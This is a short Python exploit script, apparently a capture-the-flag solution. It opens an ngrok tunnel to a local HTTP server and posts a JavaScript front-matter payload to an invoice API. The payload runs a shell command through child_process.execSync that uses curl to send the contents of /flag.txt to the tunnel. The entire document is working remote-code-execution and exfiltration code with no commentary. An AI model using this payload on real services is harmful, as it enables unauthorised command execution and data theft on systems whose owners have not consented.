import sys
import time
import subprocess
import requests
from pyngrok import ngrok

url = sys.argv[1]
url_flag = f"http://{url}/api/invoice/add"

proc = subprocess.Popen(
    ["python3", "-m", "http.server", "8000"],
    stderr=subprocess.PIPE,
    text=True
)
time.sleep(1)

tunnel = ngrok.connect(8000, bind_tls=True)
ngrok_url = tunnel.public_url

payload = f"---js\n((require(\"child_process\")).execSync(\"curl {ngrok_url}/flag?flag=$(cat /flag.txt)\"))\n---albercik"
r_flag = requests.post(url_flag, json={"markdown_content": payload})

